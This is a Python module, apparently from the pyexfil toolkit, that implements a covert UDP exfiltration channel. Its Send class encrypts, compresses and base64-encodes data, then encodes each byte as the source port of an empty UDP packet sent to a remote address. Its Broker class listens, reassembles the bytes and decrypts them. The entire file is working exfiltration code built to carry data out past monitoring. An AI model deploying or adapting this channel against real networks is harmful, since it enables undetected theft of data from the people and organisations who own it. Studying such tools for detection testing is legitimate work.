
import sys
import zlib
import socket
import random
import time
import base64

from pyexfil.includes.encryption_wrappers import AESDecryptOFB, AESEncryptOFB


class Send:
	
	DEFAULT_TIME_BETWEEN_PACKETS = 0.1
	MAX_TERMINATOR_SIZE = 12
	MULTIPLIER = 64
	REMOTE_UDP_PORT = 50239
	
	def __init__(self, key, ip_addr, dport=REMOTE_UDP_PORT, wait_time=DEFAULT_TIME_BETWEEN_PACKETS):
		self.key        = key
		self.to         = ip_addr
		self.dport      = dport
		self.timewait   = wait_time
		
	def _sendByte(self, bytes):
		if bytes > Send.MAX_TERMINATOR_SIZE:
			sport = int(str(bytes)) * Send.MULTIPLIER
		else:
			sport = int(str(bytes))

		tc_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		tc_sock.bind(('', sport))
		tc_sock.connect((self.to, self.dport))
		tc_sock.send(b"")
		return True
	
	def Sender(self, data):
		data = base64.b64encode(zlib.compress(AESEncryptOFB(self.key, data)))
		for item in data:
			self._sendByte(item)
			time.sleep(self.timewait)
		self._sendByte(random.randint(1, Send.MAX_TERMINATOR_SIZE))
		
		
class Broker():
	
	MAX_TERMINATOR_SIZE = 12
	MULTIPLIER = 64
	REMOTE_UDP_PORT = 50239
	
	def __init__(self, key, ip_addr="0.0.0.0", local_port=REMOTE_UDP_PORT):
		self.key          = key
		self.listening_ip = ip_addr
		self.local_port   = local_port
		self.current_data = ''
	
	def Listen(self):
		currently_getting = False
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		server_address = (self.listening_ip, self.local_port)
		sock.bind(server_address)
		sys.stdout.write("Waiting.\n")
		while True:
			data, address = sock.recvfrom(4096)
			thisB = address[1]
			if thisB < Broker.MAX_TERMINATOR_SIZE:
				# this is terminator byte
				sys.stdout.write("Got termination byte.\n")
				
				try:
					d = base64.b64decode(self.current_data)
				except:
					sys.stderr.write("Cannot deocde Base64. Packet broke.\n")
					return False
				
				d = zlib.decompress(d)
				d = AESDecryptOFB(self.key, d)
				sys.stdout.write("Got: '%s' from '%s'.\n" % (d, address[0]))
				currently_getting = False
				self.current_data = ""
				sock.close()
				return d
				
			else:
				self.current_data += chr(int(thisB/Broker.MULTIPLIER))
				if not currently_getting:
					currently_getting = True
					sys.stdout.write("Receiving from %s.\n" % address[0])

